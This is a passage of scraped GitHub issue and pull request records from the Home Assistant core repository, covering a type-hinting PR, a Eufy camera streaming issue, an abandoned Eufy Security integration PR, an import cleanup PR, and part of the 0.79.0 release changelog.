                "body": "## Proposed change\r\n<!--\r\n  Describe the big picture of your changes here to communicate to the\r\n  maintainers why we should accept this pull request. If it fixes a bug\r\n  or resolves a feature request, be sure to link to that issue in the\r\n  additional information section.\r\n-->\r\nAs follow-up to #63098, add more setup type hints.\r\n\r\nThese components needed a few tweaks to pass mypy.\r\n\r\n## Type of change\r\n<!--\r\n  What type of change does your PR introduce to Home Assistant?\r\n  NOTE: Please, check only 1! box!\r\n  If your PR requires multiple boxes to be checked, you'll most likely need to\r\n  split it into multiple PRs. This makes things easier and faster to code review.\r\n-->\r\n\r\n- [ ] Dependency upgrade\r\n- [ ] Bugfix (non-breaking change which fixes an issue)\r\n- [ ] New integration (thank you!)\r\n- [ ] New feature (which adds functionality to an existing integration)\r\n- [ ] Breaking change (fix/feature causing existing functionality to break)\r\n- [x] Code quality improvements to existing code or addition of tests\r\n\r\n## Additional information\r\n<!--\r\n  Details are important, and help maintainers processing your PR.\r\n  Please be sure to fill out additional details, if applicable.\r\n-->\r\n\r\n- This PR fixes or closes issue: fixes #\r\n- This PR is related to issue: \r\n- Link to documentation pull request: \r\n\r\n## Checklist\r\n<!--\r\n  Put an `x` in the boxes that apply. You can also fill these out after\r\n  creating the PR. If you're unsure about any of them, don't hesitate to ask.\r\n  We're here to help! This is simply a reminder of what we are going to look\r\n  for before merging your code.\r\n-->\r\n\r\n- [ ] The code change is tested and works locally.\r\n- [ ] Local tests pass. **Your PR cannot be merged unless tests pass**\r\n- [ ] There is no commented out code in this PR.\r\n- [ ] I have followed the [development checklist][dev-checklist]\r\n- [ ] The code has been formatted using Black (`black --fast homeassistant tests`)\r\n- [ ] Tests have been added to verify that the new code works.\r\n\r\nIf user exposed functionality or configuration variables are added/changed:\r\n\r\n- [ ] Documentation added/updated for [www.home-assistant.io][docs-repository]\r\n\r\nIf the code communicates with devices, web services, or third-party tools:\r\n\r\n- [ ] The [manifest file][manifest-docs] has all fields filled out correctly.  \r\n      Updated and included derived files by running: `python3 -m script.hassfest`.\r\n- [ ] New or updated dependencies have been added to `requirements_all.txt`.  \r\n      Updated by running `python3 -m script.gen_requirements_all`.\r\n- [ ] For the updated dependencies - a link to the changelog, or at minimum a diff between library versions is added to the PR description.\r\n- [ ] Untested files have been added to `.coveragerc`.\r\n\r\nThe integration reached or maintains the following [Integration Quality Scale][quality-scale]:\r\n<!--\r\n  The Integration Quality Scale scores an integration on the code quality\r\n  and user experience. Each level of the quality scale consists of a list\r\n  of requirements. We highly recommend getting your integration scored!\r\n-->\r\n\r\n- [ ] No score or internal\r\n- [ ] 🥈 Silver\r\n- [ ] 🥇 Gold\r\n- [ ] 🏆 Platinum\r\n\r\n<!--\r\n  This project is very active and we have a high turnover of pull requests.\r\n\r\n  Unfortunately, the number of incoming pull requests is higher than what our\r\n  reviewers can review and merge so there is a long backlog of pull requests\r\n  waiting for review. You can help here!\r\n  \r\n  By reviewing another pull request, you will help raise the code quality of\r\n  that pull request and the final review will be faster. This way the general\r\n  pace of pull request reviews will go up and your wait time will go down.\r\n  \r\n  When picking a pull request to review, try to choose one that hasn't yet\r\n  been reviewed.\r\n\r\n  Thanks for helping out!\r\n-->\r\n\r\nTo help with the load of incoming pull requests:\r\n\r\n- [ ] I have reviewed two other [open pull requests][prs] in this repository.\r\n\r\n[prs]: https://github.com/home-assistant/core/pulls?q=is%3Aopen+is%3Apr+-author%3A%40me+-draft%3Atrue+-label%3Awaiting-for-upstream+sort%3Acreated-desc+review%3Anone+-status%3Afailure\r\n\r\n<!--\r\n  Thank you for contributing <3\r\n\r\n  Below, some useful links you could explore:\r\n-->\r\n[dev-checklist]: https://developers.home-assistant.io/docs/en/development_checklist.html\r\n[manifest-docs]: https://developers.home-assistant.io/docs/en/creating_integration_manifest.html\r\n[quality-scale]: https://developers.home-assistant.io/docs/en/next/integration_quality_scale_index.html\r\n[docs-repository]: https://github.com/home-assistant/home-assistant.io\r\n",
                "comments": [
                    {
                        "body": "Hey there @fabaff, mind taking a look at this pull request as it has been labeled with an integration (`arest`) you are listed as a [code owner](https://github.com/home-assistant/core/blob/dev/CODEOWNERS#L81) for? Thanks!\n<sub><sup>(message by CodeOwnersMention)</sup></sub>",
                        "user": "probot-home-assistant[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-01-05T07:31:04Z",
                        "url": "https://github.com/home-assistant/core/pull/63424#issuecomment-1005445639"
                    },
                    {
                        "body": "Hey there @fabaff, mind taking a look at this pull request as it has been labeled with an integration (`alpha_vantage`) you are listed as a [code owner](https://github.com/home-assistant/core/blob/dev/CODEOWNERS#L54) for? Thanks!\n<sub><sup>(message by CodeOwnersMention)</sup></sub>",
                        "user": "probot-home-assistant[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-01-05T07:31:06Z",
                        "url": "https://github.com/home-assistant/core/pull/63424#issuecomment-1005445658"
                    },
                    {
                        "body": "Hey there @lonepurplewolf, mind taking a look at this pull request as it has been labeled with an integration (`airtouch4`) you are listed as a [code owner](https://github.com/home-assistant/core/blob/dev/CODEOWNERS#L44) for? Thanks!\n<sub><sup>(message by CodeOwnersMention)</sup></sub>",
                        "user": "probot-home-assistant[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-01-05T07:31:07Z",
                        "url": "https://github.com/home-assistant/core/pull/63424#issuecomment-1005445663"
                    },
                    {
                        "body": "Hey there @home-assistant/core, mind taking a look at this pull request as it has been labeled with an integration (`api`) you are listed as a [code owner](https://github.com/home-assistant/core/blob/dev/CODEOWNERS#L70) for? Thanks!\n<sub><sup>(message by CodeOwnersMention)</sup></sub>",
                        "user": "probot-home-assistant[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2022-01-05T07:31:07Z",
                        "url": "https://github.com/home-assistant/core/pull/63424#issuecomment-1005445668"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/home-assistant/core/pulls/63424",
                    "merged_at": "2022-01-05T13:15:58Z"
                }
            },
            {
                "url": "https://github.com/home-assistant/core/issues/49363",
                "title": "I have an issue playing a stream from an API \"Rest Coomand\"",
                "labels": [
                    "stale",
                    "integration: eufy_security"
                ],
                "user": "hamdanfadi",
                "issue_author_association": "NONE",
                "number": 49363,
                "id": 860546280,
                "state": "closed",
                "project_created_at": "2021-04-18T00:57:21Z",
                "closed_at": "2021-07-24T13:07:07Z",
                "body": "### The problem\r\nI'm trying to stream a camera using Rest API \r\nI'm getting an error in my log: \r\nError opening stream No Stream\r\n12:49:17 PM – (ERROR) Stream - message first occurred at 12:45:54 PM and shows up 7 times\r\n\r\nWhen I inspect the page I have found this issue:\r\nhttp://hass:8123/api/hls/fc285d4d2ae1787ea84c30736e2ada4e2a1b72869348d2784205d88427b2718f/master_playlist.m3u8\r\n\r\nCan you please hep how to resolve it?\r\n\r\nThis issue only happened after version -2021.4.x\r\n\r\nCheers,\r\n\r\n### What is version of Home Assistant Core has the issue?\r\n\r\ncore-2021.4.5\r\n\r\n### What was the last working version of Home Assistant Core?\r\n\r\ncore-2021.4.5\r\n\r\n### What type of installation are you running?\r\n\r\nHome Assistant OS\r\n\r\n### Integration causing the issue\r\n\r\nNo idea\r\n\r\n### Link to integration documentation on our website\r\n\r\n_No response_\r\n\r\n### Example YAML snippet\r\n\r\n```yaml\r\nrest_command:\r\n  eufy_start_stream:\r\n    url: \"http://192.168.88.86:8087/toggle/eufy-security.0.T8010N13203000F1.cameras.T8113N13203004DC.start_stream\"\r\n  eufy_stop_stream:\r\n    url: \"http://192.168.88.86:8087/toggle/eufy-security.0.T8010N13203000F1.cameras.T8113N13203004DC.stop_stream\"\r\n#------\r\n```\r\n\r\n\r\n### Anything in the logs that might be useful for us?\r\n\r\n_No response_\r\n\r\n### Additional information\r\n\r\n_No response_",
                "comments": [
                    {
                        "body": "> When I inspect the page I have found this issue:\r\n\r\nWhat issue ? You just posted a URL, but that does not say much.\r\n\r\nAlso how can the broken version and the last version where it worked be the same 😉? Please double check your issue info.",
                        "user": "spacegaier",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2021-04-18T12:21:59Z",
                        "url": "https://github.com/home-assistant/core/issues/49363#issuecomment-821983243"
                    },
                    {
                        "body": "[eufy_security documentation](https://www.home-assistant.io/integrations/eufy_security)\n[eufy_security source](https://github.com/home-assistant/core/tree/dev/homeassistant/components/eufy_security)\n<sub><sup>(message by IssueLinks)</sup></sub>",
                        "user": "probot-home-assistant[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2021-04-18T12:22:52Z",
                        "url": "https://github.com/home-assistant/core/issues/49363#issuecomment-821983348"
                    },
                    {
                        "body": "There hasn't been any activity on this issue recently. Due to the high number of incoming GitHub notifications, we have to clean some of the old issues, as many of them have already been resolved with the latest updates.\nPlease make sure to update to the latest Home Assistant version and check if that solves the issue. Let us know if that works for you by adding a comment 👍\nThis issue has now been marked as stale and will be closed if no further activity occurs. Thank you for your contributions.",
                        "user": "github-actions[bot]",
                        "issue_author_association": "NONE",
                        "project_created_at": "2021-07-17T13:06:55Z",
                        "url": "https://github.com/home-assistant/core/issues/49363#issuecomment-881896186"
                    }
                ],
                "pull_request": null
            },
            {
                "url": "https://github.com/home-assistant/core/pull/28443",
                "title": "Add support for Eufy Security cameras/doorbells",
                "labels": [
                    "cla-signed",
                    "docs-missing",
                    "new-integration",
                    "integration: eufy_security"
                ],
                "user": "bachya",
                "issue_author_association": "CONTRIBUTOR",
                "number": 28443,
                "id": 516230581,
                "state": "closed",
                "project_created_at": "2019-11-01T16:54:05Z",
                "closed_at": "2020-01-21T20:31:01Z",
                "body": "## Description:\r\n\r\nThis PR adds support for Eufy Security devices (cameras and doorbells). This integration is separate from the `eufy` integration.\r\n\r\n**Related issue (if applicable):** N/A\r\n\r\n**Pull request with documentation for [home-assistant.io](https://github.com/home-assistant/home-assistant.io) (if applicable):** TBD\r\n\r\n## Example entry for `configuration.yaml` (if applicable):\r\n```yaml\r\neufy_security:\r\n  username: !secret eufy_security_email\r\n  password: !secret eufy_security_password\r\n```\r\n\r\n## Checklist:\r\n  - [ ] The code change is tested and works locally.\r\n  - [ ] Local tests pass with `tox`. **Your PR cannot be merged unless tests pass**\r\n  - [ ] There is no commented out code in this PR.\r\n  - [ ] I have followed the [development checklist][dev-checklist]\r\n\r\nIf user exposed functionality or configuration variables are added/changed:\r\n  - [ ] Documentation added/updated in [home-assistant.io](https://github.com/home-assistant/home-assistant.io)\r\n\r\nIf the code communicates with devices, web services, or third-party tools:\r\n  - [ ] [_The manifest file_][manifest-docs] has all fields filled out correctly. Update and include derived files by running `python3 -m script.hassfest`.\r\n  - [ ] New or updated dependencies have been added to `requirements_all.txt` by running `python3 -m script.gen_requirements_all`.\r\n  - [ ] Untested files have been added to `.coveragerc`.\r\n\r\nIf the code does not interact with devices:\r\n  - [ ] Tests have been added to verify that the new code works.\r\n\r\n[dev-checklist]: https://developers.home-assistant.io/docs/en/development_checklist.html\r\n[manifest-docs]: https://developers.home-assistant.io/docs/en/creating_integration_manifest.html\r\n",
                "comments": [
                    {
                        "body": "There is a ways to go before this is ready – even then, based on what we're seeing, it may be better served as a custom component. Going to close for now.",
                        "user": "bachya",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2020-01-21T20:31:00Z",
                        "url": "https://github.com/home-assistant/core/pull/28443#issuecomment-576867251"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/home-assistant/core/pulls/28443",
                    "merged_at": null
                }
            },
            {
                "url": "https://github.com/home-assistant/core/pull/27807",
                "title": "Move imports in asterisk_mbox component",
                "labels": [
                    "Hacktoberfest",
                    "cla-signed",
                    "integration: asterisk_mbox",
                    "small-pr"
                ],
                "user": "Bouni",
                "issue_author_association": "CONTRIBUTOR",
                "number": 27807,
                "id": 508526603,
                "state": "closed",
                "project_created_at": "2019-10-17T14:45:12Z",
                "closed_at": "2019-10-18T00:08:59Z",
                "body": "## Breaking Change:\r\n\r\nNone\r\n\r\n## Description:\r\n\r\nMoved import from function to top-level as requested in #27284\r\n\r\n## Checklist:\r\n\r\n- [ ] The code change is tested and works locally.\r\n- [x] Local tests pass with tox. Your PR cannot be merged unless tests pass\r\n- [x] There is no commented out code in this PR.\r\n- [x] I have followed the development checklist\r\n\r\nNote: imports sorted using [isort](https://pypi.org/project/isort/)",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/home-assistant/core/pulls/27807",
                    "merged_at": "2019-10-18T00:08:59Z"
                }
            },
            {
                "url": "https://github.com/home-assistant/core/pull/16940",
                "title": "0.79.0",
                "labels": [
                    "core",
                    "merging-to-master",
                    "integration: alexa",
                    "integration: spc",
                    "integration: asterisk_mbox",
                    "integration: apple_tv",
                    "integration: auth"
                ],
                "user": "balloob",
                "issue_author_association": "MEMBER",
                "number": 16940,
                "id": 364892189,
                "state": "closed",
                "project_created_at": "2018-09-28T13:36:46Z",
                "closed_at": "2018-09-28T14:51:25Z",
                "body": "## New Platforms\r\n\r\n- Add Huawei LTE router platform, device tracker, and sensor ([@scop] - [#16498]) ([device_tracker docs]) ([huawei_lte docs]) ([sensor.huawei_lte docs]) (new-platform)\r\n- New EDP re:dy component ([@abmantis] - [#16426]) ([edp_redy docs]) ([sensor.edp_redy docs]) ([switch.edp_redy docs]) (new-platform)\r\n- Jewish calendar sensor ([@tsvi] - [#16393]) ([sensor.jewish_calendar docs]) (new-platform)\r\n- Added support for Starling Bank ([@Dullage] - [#16522]) ([sensor.starlingbank docs]) (new-platform)\r\n- Add Call Data Log platform. Mailboxes no longer require media ([@PhracturedBlue] - [#16579]) ([asterisk_mbox docs]) ([mailbox docs]) ([mailbox.asterisk_cdr docs]) ([mailbox.asterisk_mbox docs]) (new-platform)\r\n- Add Logi Circle component, camera and sensor platform ([@evanjd] - [#16540]) ([logi_circle docs]) ([camera.logi_circle docs]) ([sensor.logi_circle docs]) (new-platform)\r\n- deCONZ cover support ([@Kane610] - [#16759]) ([cover docs]) ([deconz docs]) ([cover.deconz docs]) (new-platform)\r\n- GeoJSON platform ([@exxamalte] - [#16610]) ([geo_location docs]) (new-platform)\r\n- Add linky sensor ([@tiste] - [#16468]) ([sensor.linky docs]) (new-platform)\r\n\r\n## Breaking Changes\r\n\r\n- Netdata configuration change: Allows multiple elements per group. Specify the `data_group` as part of the sensor description. See docs for details. ([@reefab] - [#16656]) ([sensor.netdata docs]) (breaking change)\r\n- The Dyson sensor Air Quality Index is now named AQI following Dyson's mobile app ([@glpatcern] - [#14550]) ([sensor.dyson docs]) (breaking change)\r\n\r\n## Beta Fixes\r\n\r\n- Don't warn but info when on dev mode ([@balloob] - [#16831]) ([updater docs]) (beta fix)\r\n- Bump zm-py to 0.0.3 ([@rohankapoorcom] - [#16835]) ([zoneminder docs]) (beta fix)\r\n- Support old tradfri config format ([@balloob] - [#16841]) ([tradfri docs]) (beta fix)\r\n- Allow MQTT discovery ([@balloob] - [#16842]) ([mqtt docs]) (beta fix)\r\n- Add unique ID and device info to Nest camera ([@balloob] - [#16846]) ([camera.nest docs]) (beta fix)\r\n- Device Registry Support for iOS Sensors ([@cgarwood] - [#16862]) ([sensor.ios docs]) (beta fix)\r\n- Fix MQTT discovery ([@balloob] - [#16864]) ([mqtt docs]) (beta fix)\r\n- Make ring sync again ([@balloob] - [#16866]) ([camera.ring docs]) (beta fix)\r\n- Add unique_id to Nest Sensors ([@cgarwood] - [#16869]) ([binary_sensor.nest docs]) ([sensor.nest docs]) (beta fix)\r\n- Prevent discovered Tradfri while already configured ([@balloob] - [#16891]) ([tradfri docs]) (beta fix)\r\n- Handle exception handling websocket command ([@balloob] - [#16927]) ([websocket_api docs]) (beta fix)\r\n\r\n## All changes\r\n\r\n- Upgrade wakeonlan to 1.1.6 ([@fabaff] - [#16512]) ([wake_on_lan docs]) ([media_player.panasonic_viera docs]) ([media_player.samsungtv docs]) ([switch.wake_on_lan docs])\r\n- Make the Qnap sensor more resilient if server is not reachable ([@mrosseel] - [#16445]) ([sensor.qnap docs])\r\n- Update PyRMVtransport version ([@cgtobi] - [#16547]) ([sensor.rmvtransport docs])\r\n- Isort preparations ([@scop] - [#16555]) ([apple_tv docs]) ([geo_location docs]) ([google_assistant docs]) ([rachio docs]) ([media_player.cast docs]) ([media_player.webostv docs])\r\n- Store notifications in component. Add ws endpoint for fetching. ([@jeradM] - [#16503]) ([http docs]) ([persistent_notification docs])\r\n- Fixes an OpenUV bug with the scan interval ([@bachya] - [#16570]) ([openuv docs])\r\n- Bump pyeconet ([@w1ll1am23] - [#16571]) ([climate.econet docs])\r\n- yr: use async syntax ([@Danielhiversen] - [#16563]) ([sensor.yr docs])\r\n- Notifications for Android TV: Add fontsize and sending images ([@danielperna84] - [#16565]) ([notify docs])\r\n- Upgrade pytest to 3.8.0 and pytest-timeout to 1.3.2 ([@scop] - [#16489])\r\n- Refactor zha/async_device_initialized(). ([@Adminiuga] - [#16485]) ([zha docs])\r\n- Update fan.zha platform. ([@Adminiuga] - [#16551]) ([fan.zha docs])\r\n- Hangouts help \"page\" and little bugfix ([@hobbypunk90] - [#16464]) ([hangouts docs])\r\n- Konnected component feature updates ([@heythisisnate] - [#16479]) ([konnected docs])\r\n- Add config entry to iOS ([@balloob] - [#16580]) ([ios docs]) ([notify docs])\r\n- Switchmate ([@Danielhiversen] - [#16395]) ([switch.switchmate docs])\r\n- Update pyhomematic to 0.1.48 ([@danielperna84] - [#16588]) ([homematic docs])\r\n- Add configure_reporting() method to zha component ([@Adminiuga] - [#16487]) ([zha docs]) ([binary_sensor.zha docs]) ([sensor.zha docs])\r\n- Allow only_cache parameter in zha.safe_read() ([@Adminiuga] - [#16553]) ([zha docs])\r\n- Update tibber lib version ([@Danielhiversen] - [#16590]) ([sensor.tibber docs])\r\n- xiaomi lib 0.10.0 ([@Danielhiversen] - [#16591]) ([xiaomi_aqara docs])\r\n- Support for the Quirky Nimbus ([@w1ll1am23] - [#16520]) ([wink docs]) ([climate.wink docs])\r\n- Multiple tag managers for Wireless Sensor Tags. ([@sergeymaysak] - [#16353]) ([wirelesstag docs]) ([binary_sensor.wirelesstag docs]) ([sensor.wirelesstag docs]) ([switch.wirelesstag docs])\r\n- Add Huawei LTE router platform, device tracker, and sensor ([@scop] - [#16498]) ([device_tracker docs]) ([huawei_lte docs]) ([sensor.huawei_lte docs]) (new-platform)\r\n- Changing z-wave brightness calculation to respect 0x01 and 0x02 byte values ([@Harvtronix] - [#16420]) ([light.zwave docs])\r\n- Add myself to CODEOWNERS for upcloud ([@scop] - [#16599])\r\n- Add websocket list APIs for the registries ([@balloob] - [#16597]) ([config docs])\r\n- MQTT config entry ([@balloob] - [#16594]) ([hangouts docs]) ([homematicip_cloud docs]) ([mqtt docs])\r\n- Upgrade python-twitch-client to 0.6.0 ([@fabaff] - [#16602]) ([sensor.twitch docs])\r\n- Improve precision of timer ticks ([@amelchio] - [#16598])\r\n- Switch components.sensor.zha to await syntax. ([@Adminiuga] - [#16619]) ([sensor.zha docs])\r\n- Adding support for RTDSContactSensor and RTDSMotionSensor in Tahoma … (RTS Alarms sensors and contacts for Somfy Protexiom alarms) ([@christopheBfr] - [#16609]) ([tahoma docs]) ([sensor.tahoma docs])\r\n- fix bug where momentary switch with activation low does not reset ([@heythisisnate] - [#16603]) ([switch.konnected docs])\r\n- Extracting zoneminder to a new library ([@rohankapoorcom] - [#16527]) ([zoneminder docs]) ([camera.zoneminder docs])\r\n- Add @rohankapoorcom to CODEOWNERS for the zoneminder platform ([@rohankapoorcom] - [#16627])\r\n- Small huawei_lte improvements ([@scop] - [#16626]) ([huawei_lte docs]) ([sensor.huawei_lte docs])\r\n- Upgrade pwmled to 1.3.0 ([@soldag] - [#16624]) ([light.rpi_gpio_pwm docs])\r\n- Clean up MjpegCamera by removing unnused hass object in __init__ ([@rohankapoorcom] - [#16628]) ([camera.axis docs]) ([camera.mjpeg docs]) ([camera.zoneminder docs])\r\n- Update developer doc links to developers.home-assistant.io ([@scop] - [#16622]) ([websocket_api docs])\r\n- Add valid_window=1 to TOTP verify ([@awarecan] - [#16625])\r\n- Add new devices to HomematicIP Cloud ([@mxworm] - [#16636]) ([binary_sensor.homematicip_cloud docs]) ([sensor.homematicip_cloud docs])\r\n- New EDP re:dy component ([@abmantis] - [#16426]) ([edp_redy docs]) ([sensor.edp_redy docs]) ([switch.edp_redy docs]) (new-platform)\r\n- Upgrade Switchmate lib ([@Danielhiversen] - [#16637]) ([switch.switchmate docs])\r\n- Update pyhomematic to 0.1.49 ([@danielperna84] - [#16649]) ([homematic docs])\r\n- Upgrade holidays to 0.9.7 ([@fabaff] - [#16651]) ([binary_sensor.workday docs])\r\n- Fix link to docs ([@fabaff] - [#16652]) ([vacuum.ecovacs docs])\r\n- Log raw result of configure_reporting() command. ([@Adminiuga] - [#16655]) ([zha docs])\r\n- Rework timer delays ([@amelchio] - [#16650])\r\n- Add config entries to connection class ([@balloob] - [#16618])\r\n- Add zha device entity ([@damarco] - [#14579]) ([zha docs])\r\n- Clean up device update, add via-hub ([@balloob] - [#16659])\r\n- Jewish calendar sensor ([@tsvi] - [#16393]) ([sensor.jewish_calendar docs]) (new-platform)\r\n- Fixes an AirVisual bug where response data is missing ([@bachya] - [#16673]) ([sensor.airvisual docs])\r\n- Suppress traceback and log error ([@fabaff] - [#16669]) ([sensor.scrape docs])\r\n- Fix Ecovacs vacuums showing \"None\" for name ([@OverloadUT] - [#16654]) ([ecovacs docs]) ([vacuum.ecovacs docs])\r\n- Upgrade paho-mqtt to 1.4.0 ([@fabaff] - [#16688]) ([mqtt docs]) ([shiftr docs])\r\n- Streamline log messages ([@gwww] - [#16243])\r\n- Added velbus counter sensors, updated to py-velbus 2.0.20 ([@Cereal2nd] - [#16683]) ([velbus docs]) ([sensor.velbus docs])\r\n- Added support for Starling Bank ([@Dullage] - [#16522]) ([sensor.starlingbank docs]) (new-platform)\r\n- Netdata configuration change: Allows multiple elements per group ([@reefab] - [#16656]) ([sensor.netdata docs]) (breaking change)\r\n- Upgrade mypy to 0.630 ([@scop] - [#16674])\r\n- Use one regex for Hass.io URL check ([@pvizeli] - [#16710]) ([hassio docs])\r\n- Remove usage of \"run_until_complete\" ([@smurfix] - [#16617])\r\n- More isort preparations ([@scop] - [#16633])\r\n- Use posargs in tox lint env ([@scop] - [#16646])\r\n- Make pylint report non-LF linefeeds per the style guidelines ([@scop] - [#16601])\r\n- Config flow tradfri ([@balloob] - [#16665])\r\n- MyQ Open State Fix ([@geekofweek] - [#16681]) ([cover.myq docs])\r\n- Save disabled_by in entity registry ([@cgarwood] - [#16699])\r\n- Upgrading librouteros version ([@kunago] - [#16718]) ([device_tracker docs])\r\n- Add unique_id to mqtt_json light ([@nikolaykasyanov] - [#16721])\r\n- On-demand update of swiss public transport sensor ([@vikramgorla] - [#16723]) ([sensor.swiss_public_transport docs])\r\n- Upgrade youtube_dl to 2018.09.18 ([@fabaff] - [#16729]) ([media_extractor docs])\r\n- Met.no weather platform ([@Danielhiversen] - [#16582])\r\n- Upgrade keyring to 15.1.0 ([@fabaff] - [#16734])\r\n- Avoid calling yr update every second for a minute ones every hour ([@Danielhiversen] - [#16731]) ([sensor.yr docs])\r\n- Upgrade shodan to 1.10.2 ([@fabaff] - [#16736]) ([sensor.shodan docs])\r\n- Add subscription info endpoint ([@balloob] - [#16727]) ([cloud docs]) ([websocket_api docs])\r\n- Small cleanup for slack ([@pvizeli] - [#16743]) ([notify docs])\r\n- light.zha: Catch exceptions for all commands. ([@Adminiuga] - [#16752]) ([light.zha docs])\r\n- Changed save_on_change to default to False ([@zoe1337] - [#16744]) ([light.yeelight docs])\r\n- Add option to disable specific integrations ([@balloob] - [#16757]) ([alexa docs]) ([cloud docs]) ([google_assistant docs])\r\n- Use pysonos for Sonos media player ([@amelchio] - [#16753]) ([sonos docs]) ([media_player.sonos docs])\r\n- deCONZ add via_hub attribute for device registry ([@Kane610] - [#16760]) ([binary_sensor.deconz docs]) ([light.deconz docs]) ([sensor.deconz docs]) ([switch.deconz docs])\r\n- Upgrade pysonos to 0.0.2 ([@amelchio] - [#16761])\r\n- Fix faulty color temp crashing google ([@balloob] - [#16758]) ([google_assistant docs])\r\n- Add Call Data Log platform. Mailboxes no longer require media ([@PhracturedBlue] - [#16579]) ([asterisk_mbox docs]) ([mailbox docs]) ([mailbox.asterisk_cdr docs]) ([mailbox.asterisk_mbox docs]) (new-platform)\r\n- Implement support for complex templates in script delays ([@rohankapoorcom] - [#16442])\r\n- Add Logi Circle component, camera and sensor platform ([@evanjd] - [#16540]) ([logi_circle docs]) ([camera.logi_circle docs]) ([sensor.logi_circle docs]) (new-platform)\r\n- Zha switch schedule update state ([@Adminiuga] - [#16621]) ([switch.zha docs])\r\n- Add Carbon Monoxide HomeKit Sensor ([@cdce8p] - [#16664]) ([homekit docs])\r\n- Add unique_id to mqtt camera ([@bieniu] - [#16569]) ([camera.mqtt docs])\r\n- Add tradfri device info ([@balloob] - [#16768])\r\n- Make rest sensor and binary sensor more efficient ([@exxamalte] - [#14484]) ([binary_sensor.rest docs]) ([sensor.rest docs])\r\n- Refactored units and icons for the Dyson sensors ([@glpatcern] - [#14550]) ([sensor.dyson docs]) (breaking change)\r\n- Add confirmation to Cast/Sonos/iOS config entries ([@balloob] - [#16769])\r\n- deCONZ cover support ([@Kane610] - [#16759]) ([cover docs]) ([deconz docs]) ([cover.deconz docs]) (new-platform)\r\n- GeoJSON platform ([@exxamalte] - [#16610]) ([geo_location docs]) (new-platform)\r\n- Upgrade restrictedpython to 4.0b5 ([@fabaff] - [#16779]) ([python_script docs])\r\n- Upgrade bimmer_connected to 0.5.2 ([@gerard33] - [#16780]) ([bmw_connected_drive docs])\r\n- Fix Windows loop ([@balloob] - [#16737])\r\n- Fix return to base logic for neato ([@dshokouhi] - [#16776]) ([vacuum.neato docs])\r\n- Update Tibber lib ([@Danielhiversen] - [#16795])\r\n- Bump pybotvac to 0.0.10 ([@dshokouhi] - [#16799]) ([neato docs])\r\n- Bump zm-py up to 0.0.2 ([@rohankapoorcom] - [#16800]) ([zoneminder docs])\r\n- Bump sucks (Ecovacs) lib to 0.9.3 ([@OverloadUT] - [#16803]) ([ecovacs docs]) ([vacuum.ecovacs docs])\r\n- Upgrade zeroconf to 0.21.3 ([@tadly] - [#16789])\r\n- Add Tuya cover state ([@huangyupeng] - [#16709]) ([cover.tuya docs])\r\n- Add configurable host for bbox routers ([@isonet] - [#16778])\r\n- Set botvac state when offline ([@dshokouhi] - [#16805]) ([vacuum.neato docs])\r\n- Handle netgear_lte connection errors ([@amelchio] - [#16806]) ([netgear_lte docs]) ([notify docs]) ([sensor.netgear_lte docs])\r\n- Improve opentherm_gw state detection ([@mvn23] - [#16809]) ([climate.opentherm_gw docs])\r\n- Rework chromecast fix ([@awarecan] - [#16804]) ([media_player.cast docs])\r\n- Add linky sensor ([@tiste] - [#16468]) ([sensor.linky docs]) (new-platform)\r\n- Use pyspcwebgw for SPC component ([@mbrrg] - [#16214]) ([spc docs]) ([alarm_control_panel.spc docs]) ([binary_sensor.spc docs])\r\n- Remove discovered MQTT Switch device when discovery topic is cleared ([@emontnemery] - [#16605]) ([mqtt docs]) ([switch.mqtt docs])\r\n- Allow split component definitions in packages ([@thomasloven] - [#16177])\r\n- Add Notify MFA module ([@awarecan] - [#16314])\r\n- Broadlink service name ([@Danielhiversen] - [#16345]) ([switch.broadlink docs])\r\n- Add Python 3.7 classifier ([@scop] - [#16645])\r\n- Allow soundtouch to play https content too ([@robin13] - [#16713]) ([media_player.soundtouch docs])\r\n- Fix some unhandled exceptions due to missing null checks ([@OverloadUT] - [#16812]) ([cover.isy994 docs]) ([light.isy994 docs])\r\n- Don't warn but info when on dev mode ([@balloob] - [#16831]) ([updater docs]) (beta fix)\r\n- Bump zm-py to 0.0.3 ([@rohankapoorcom] - [#16835]) ([zoneminder docs]) (beta fix)\r\n- Support old tradfri config format ([@balloob] - [#16841]) ([tradfri docs]) (beta fix)\r\n- Allow MQTT discovery ([@balloob] - [#16842]) ([mqtt docs]) (beta fix)\r\n- Add unique ID and device info to Nest camera ([@balloob] - [#16846]) ([camera.nest docs]) (beta fix)\r\n- Device Registry Support for iOS Sensors ([@cgarwood] - [#16862]) ([sensor.ios docs]) (beta fix)\r\n- Fix MQTT discovery ([@balloob] - [#16864]) ([mqtt docs]) (beta fix)\r\n- Make ring sync again ([@balloob] - [#16866]) ([camera.ring docs]) (beta fix)\r\n- Add unique_id to Nest Sensors ([@cgarwood] - [#16869]) ([binary_sensor.nest docs]) ([sensor.nest docs]) (beta fix)\r\n- Prevent discovered Tradfri while already configured ([@balloob] - [#16891]) ([tradfri docs]) (beta fix)\r\n- Handle exception handling websocket command ([@balloob] - [#16927]) ([websocket_api docs]) (beta fix)\r\n\r\n[#14484]: https://github.com/home-assistant/home-assistant/pull/14484\r\n[#14550]: https://github.com/home-assistant/home-assistant/pull/14550\r\n[#14579]: https://github.com/home-assistant/home-assistant/pull/14579\r\n[#16177]: https://github.com/home-assistant/home-assistant/pull/16177\r\n[#16214]: https://github.com/home-assistant/home-assistant/pull/16214\r\n[#16243]: https://github.com/home-assistant/home-assistant/pull/16243\r\n[#16314]: https://github.com/home-assistant/home-assistant/pull/16314\r\n[#16345]: https://github.com/home-assistant/home-assistant/pull/16345\r\n[#16353]: https://github.com/home-assistant/home-assistant/pull/16353\r\n[#16393]: https://github.com/home-assistant/home-assistant/pull/16393\r\n[#16395]: https://github.com/home-assistant/home-assistant/pull/16395\r\n[#16420]: https://github.com/home-assistant/home-assistant/pull/16420\r\n[#16426]: https://github.com/home-assistant/home-assistant/pull/16426\r\n[#16442]: https://github.com/home-assistant/home-assistant/pull/16442\r\n[#16445]: 